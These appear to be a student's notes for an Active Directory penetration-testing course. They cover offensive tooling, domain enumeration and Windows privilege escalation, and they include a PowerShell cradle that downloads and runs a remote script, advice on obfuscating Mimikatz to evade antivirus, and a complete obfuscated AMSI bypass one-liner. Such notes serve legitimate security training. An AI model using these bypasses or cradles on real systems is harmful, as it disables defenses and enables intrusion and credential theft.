# Tools and scripts 
kerbrute-master
Rubeus.exe 
impacket in /usr/share/doc/python3-impacket/
powerup script
bloodhound
enum4linux


Load a PowerShell script using dot sourcing
. C:\AD\PowerView.ps1

A module (or a script) can be imported with:
Import-Module C:\AD\ActiveDirectory.psd1

All the commands in a module can be listed with:
Get-Command -Module module-name

Check out Invoke-CradleCrafter:
https://github.com/danielbohannon/Invoke-CradleCrafter

Download execute cradle
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

PowerShell Detections
• System-wide transcription
• Script Block logging
• AntiMalware Scan Interface (AMSI)
• Constrained Language Mode (CLM) - Integrated with AppLocker and WDAC (Device Guard)

15 ways to bypass PowerShell execution policy
https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershellexecution-policy

We will use Invisi-Shell (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell.

We can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) or DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary or script that Windows Defender may flag.

For full obfuscation of PowerShell scripts, see Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation). That is used for obfuscating the AMSI bypass in the course!

More on PowerShell obfuscation - https://github.com/t3l3machus/PowerShell-Obfuscation-Bible

We can find the line number of the detected part using ByteToLineNumber.ps1 script , we get the byte after Scan using DefenderCheck

We must rename Invoke-Mimikatz before scanning with AmsiTrigger or we get an access denied.

Rebuild a powerkatz dll from Mimikatz source and use ProtectMyTooling to obfuscate the powerkatz dll
ProtectMyTooling: https://github.com/mgeeky/ProtectMyTooling

A repo of popular Offensive C# tools - https://github.com/Flangvik/SharpCollection

Tools such as Codecepticon (https://github.com/Accenture/Codecepticon) can also obfuscate the source code to bypass any signature-related detection.

A great tool to obfuscate the compiled binary is ConfuserEx (https://mkaring.github.io/ConfuserEx/)
ConfuserEx is a free .NET obfuscator, which can stop AVs from performing signature based detection.

CsWhispers - https://github.com/rasta-mouse/CsWhispers
Original NetLoader - https://github.com/Flangvik/NetLoader
We are using NetLoader with CsWhispers project to add D/Invoke and indirect syscall execution as NetLoader uses classic Process Injection WinAPIs which is flagged on basic import table analysis.



# Active Directory Enumeration 

---

For enumeration we can use the following tools

The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)
https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps
https://github.com/samratashok/ADModule
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

BloodHound (C# and PowerShell Collectors)
https://github.com/BloodHoundAD/BloodHound

PowerView (PowerShell)
https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1
. C:\AD\Tools\PowerView.ps1

SharpView (C#) - Doesn't support filtering using Pipeline
https://github.com/tevora-threat/SharpView/

For enumerating shares, we can also use PowerHuntShares
(https://github.com/NetSPI/PowerHuntShares).

Use SOAPHound for even more stealth
https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/
https://github.com/FalconForceTeam/SOAPHound

For enumerating shares, we can also use PowerHuntShares
(https://github.com/NetSPI/PowerHuntShares).

It can discover shares, sensitive files, ACLs for shares, networks, computers, identities etc. and generates a nice HTML report.
```
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
```

[126]

---
# Lab 

The lab manual uses the following AMSI bypass:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GetvarI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f'.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"(( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}"-f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

If you load PowerView and the ADModule in same PowerShell session, some functions may not work
[done 5]


---

# Privilege Escalation
Tools :
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Privesc: https://github.com/itm4n/PrivescCheck
- winPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

Run all checks from :
- PowerUp
```
Invoke-AllChecks
```
- Privesc:
```
Invoke-PrivEscCheck
```
- PEASS-ng:
```
winPEASx64.exe
```


Services Issues using PowerUp :

Get services with unquoted paths and a space in their name.
```
Get-ServiceUnquoted -Verbose
```
Get services where the current user can write to its binary path or change arguments to the binary
```
Get-ModifiableServiceFile -Verbose
```
Get the services whose configuration current user can modify.
```
Get-ModifiableService -Verbose
```


